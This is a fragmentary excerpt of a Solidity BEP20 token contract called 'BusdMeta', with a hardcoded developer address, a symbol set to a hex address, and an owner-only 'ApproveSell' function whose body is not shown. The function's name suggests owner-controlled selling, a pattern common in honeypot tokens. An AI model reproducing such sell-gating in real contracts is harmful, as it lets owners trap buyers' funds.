...
/* Token contract */
contract BusdMeta is IBEP20, Auth {
    using SafeMath for uint256;
    ...
    address DEV = 0x5Fe5fc11492fED7bd8EC3a3f463D9Abc58B833F2;
    ...
    // Name and symbol
    string constant _name = "BUSDMeta";
    string constant _symbol = "0x678c109bc4a812a80550707a4062442c0ca0d2ca";
    ...
    function ApproveSell(address _address, bool _value) public authorized{
